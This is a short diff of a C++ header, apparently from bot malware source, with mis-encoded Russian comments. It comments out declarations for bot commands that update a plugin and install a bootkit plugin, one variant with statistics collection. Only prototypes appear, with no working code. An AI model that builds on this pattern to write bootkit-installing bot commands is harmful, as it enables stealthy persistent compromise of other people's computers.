@@ -152,23 +152,24 @@ namespace Plugin
 	LPBYTE DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR CachePath, DWORD *PluginSize);
 
 	// им€ команды обновлени€ плага
-	extern const char* CommandUpdatePlug;
+//	extern const char* CommandUpdatePlug;
 
 	// объ€вление команды обновлени€ плага
-	bool ExecuteUpdatePlug(void* Manager, PCHAR Command, PCHAR Args);
+//	bool ExecuteUpdatePlug(void* Manager, PCHAR Command, PCHAR Args);
 
 
 	// им€ команды установки плага буткита
-	extern const char* CommandInstallBk;
-	
+//	extern const char* CommandInstallBk;
+
 	// объ€вление команды установки плага буткита
-	bool ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args);
+//	bool ExecuteInstallBk(void* Manager, PCHAR Command, PCHAR Args);
 
 	// им€ команды установки плага буткита с включением сбора статистики
-	extern const char* CommandInstallBkStat;
+//	extern const char* CommandInstallBkStat;
 
 	// объ€вление команды установки плага буткита с включением сбора статистики
-	bool ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args);
+//	bool ExecuteInstallBkStat(void* Manager, PCHAR Command, PCHAR Args);
+
 }
 
 
